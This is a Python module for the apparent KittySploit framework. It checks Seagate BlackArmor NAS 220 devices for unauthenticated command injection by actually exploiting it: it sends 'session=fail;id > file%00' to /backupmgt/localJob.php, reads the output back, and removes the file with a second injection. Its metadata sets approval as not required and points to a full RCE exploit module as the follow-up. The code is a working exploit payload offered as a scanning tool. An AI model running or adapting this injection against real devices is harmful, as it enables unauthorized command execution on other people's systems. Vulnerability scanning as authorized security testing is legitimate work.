#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Seagate BlackArmor NAS 220 backupmgt localJob.php command injection."""

import re
import secrets

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Seagate BlackArmor NAS 220 - localJob.php RCE Detection',
        'description': (
            'Detects command injection in /backupmgt/localJob.php?session=fail;<cmd>+>+file%00 '
            'on Seagate BlackArmor NAS 220 (Greenbone Jul 2021 active check).'
        ),
        'author': ['KittySploit Team'],
        'severity': 'critical',
        'tags': [
            'web', 'scanner', 'seagate', 'nas', 'rce', 'cmdi', 'unauth', 'vuln',
        ],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 3,
            'reversible': False,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.2,
            'noise': 0.5,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0, 'min_params': 0,
                'tech_hints_any': [], 'tech_hints_all': [],
                'specializations_any': [], 'risk_signals_any': [],
                'auth_session': False, 'capabilities_any': [], 'capabilities_all': [],
                'confidence_min': {}, 'confidence_min_any': {},
                'endpoint_pattern_any': [], 'param_any': [], 'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [{'capability': 'rce', 'from_detail': ''}],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [
                    'exploits/linux/http/seagate_blackarmor_localjob_rce',
                ],
            },
        },
        'references': [
            'https://www.exploit-db.com/exploits/50158',
        ],
    }

    def run(self):
        name = secrets.token_hex(6)
        inj = f'/backupmgt/localJob.php?session=fail;id+>+{name}%00'
        self.http_request(method='GET', path=inj, allow_redirects=False)
        r = self.http_request(method='GET', path=f'/backupmgt/{name}', allow_redirects=False)
        self.http_request(
            method='GET',
            path=f'/backupmgt/localJob.php?session=fail;rm+{name}%00',
            allow_redirects=False,
        )
        if r and re.search(r'uid=\d+', r.text or ''):
            self.set_info(
                severity='critical',
                reason='Seagate BlackArmor NAS localJob.php RCE detected',
                path='/backupmgt/localJob.php',
            )
            return True
        return False
